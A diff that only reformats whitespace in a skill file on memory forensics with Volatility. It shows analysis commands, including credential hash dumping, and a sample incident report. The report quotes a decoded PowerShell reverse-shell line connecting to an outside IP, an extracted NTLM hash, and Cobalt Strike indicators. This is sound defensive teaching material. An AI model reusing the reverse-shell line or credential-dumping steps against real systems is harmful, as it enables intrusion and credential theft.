@@ -1,11 +1,11 @@
 ---
 name: analyzing-memory-dumps-with-volatility
 description: 'Analyzes RAM memory dumps from compromised systems using the Volatility framework to identify malicious processes,
-  injected code, network connections, loaded modules, and extracted credentials. Supports Windows, Linux, and macOS memory
-  forensics. Activates for requests involving memory forensics, RAM analysis, volatile data examination, process injection
-  detection, or memory-resident malware investigation.
+ injected code, network connections, loaded modules, and extracted credentials. Supports Windows, Linux, and macOS memory
+ forensics. Activates for requests involving memory forensics, RAM analysis, volatile data examination, process injection
+ detection, or memory-resident malware investigation.
 
-  '
+ '
 domain: cybersecurity
 subdomain: malware-analysis
 tags:
@@ -171,7 +171,7 @@ vol3 -f memory.dmp windows.envars --pid 2184
 
 # Registry analysis (extract Run keys for persistence)
 vol3 -f memory.dmp windows.registry.printkey \
-  --key "Software\Microsoft\Windows\CurrentVersion\Run"
+ --key "Software\Microsoft\Windows\CurrentVersion\Run"
 
 # Extract hashed/cached credentials
 vol3 -f memory.dmp windows.hashdump
@@ -271,43 +271,43 @@ vol3 -f memory.dmp windows.netscan --output csv > network.csv
 ```
 MEMORY FORENSICS ANALYSIS REPORT
 ===================================
-Dump File:        memory.dmp
-Dump Size:        16 GB
-OS Version:       Windows 10 21H2 (Build 19044)
-Capture Tool:     WinPmem 4.0
-Capture Time:     2025-09-15 14:35:00 UTC
+Dump File: memory.dmp
+Dump Size: 16 GB
+OS Version: Windows 10 21H2 (Build 19044)
+Capture Tool: WinPmem 4.0
+Capture Time: 2025-09-15 14:35:00 UTC
 
 SUSPICIOUS PROCESSES
-PID   PPID  Name              Path                                    Anomaly
-2184  1052  svchost.exe       C:\Users\Admin\AppData\Temp\svchost.exe Wrong path
-4012  2184  powershell.exe    C:\Windows\System32\powershell.exe      Child of fake svchost
-3456  4012  cmd.exe           C:\Windows\System32\cmd.exe             Spawned by PowerShell
+PID PPID Name Path Anomaly
+2184 1052 svchost.exe C:\Users\Admin\AppData\Temp\svchost.exe Wrong path
+4012 2184 powershell.exe C:\Windows\System32\powershell.exe Child of fake svchost
+3456 4012 cmd.exe C:\Windows\System32\cmd.exe Spawned by PowerShell
 
 CODE INJECTION DETECTED (malfind)
 PID 852 (explorer.exe):
-  Address: 0x00400000  Size: 98304  Protection: PAGE_EXECUTE_READWRITE
-  Header: MZ (embedded PE detected)
-  SHA-256 of dump: abc123def456...
+ Address: 0x00400000 Size: 98304 Protection: PAGE_EXECUTE_READWRITE
+ Header: MZ (embedded PE detected)
+ SHA-256 of dump: abc123def456...
 
 NETWORK CONNECTIONS
-PID   Process         Local           Foreign              State
-2184  svchost.exe     10.1.5.42:49152 185.220.101.42:443   ESTABLISHED
-4012  powershell.exe  10.1.5.42:49200 91.215.85.17:8080    ESTABLISHED
+PID Process Local Foreign State
+2184 svchost.exe 10.1.5.42:49152 185.220.101.42:443 ESTABLISHED
+4012 powershell.exe 10.1.5.42:49200 91.215.85.17:8080 ESTABLISHED
 
 EXTRACTED CREDENTIALS
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
 COMMAND LINE HISTORY
 PID 4012: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
-  Decoded: $client = New-Object System.Net.Sockets.TCPClient("185.220.101.42",443)
+ Decoded: $client = New-Object System.Net.Sockets.TCPClient("185.220.101.42",443)
 
 YARA MATCHES
 PID 2184: rule CobaltStrike_Beacon { matched at 0x00401200 }
 
 TIMELINE
-14:10:00  svchost.exe (PID 2184) created from C:\Users\Admin\AppData\Temp\
-14:10:05  Network connection to 185.220.101.42:443 established
-14:12:30  powershell.exe (PID 4012) spawned by svchost.exe
-14:15:00  Code injection into explorer.exe (PID 852) detected
-14:20:00  Credential dump from LSASS process
+14:10:00 svchost.exe (PID 2184) created from C:\Users\Admin\AppData\Temp\
+14:10:05 Network connection to 185.220.101.42:443 established
+14:12:30 powershell.exe (PID 4012) spawned by svchost.exe
+14:15:00 Code injection into explorer.exe (PID 852) detected
+14:20:00 Credential dump from LSASS process
 ```
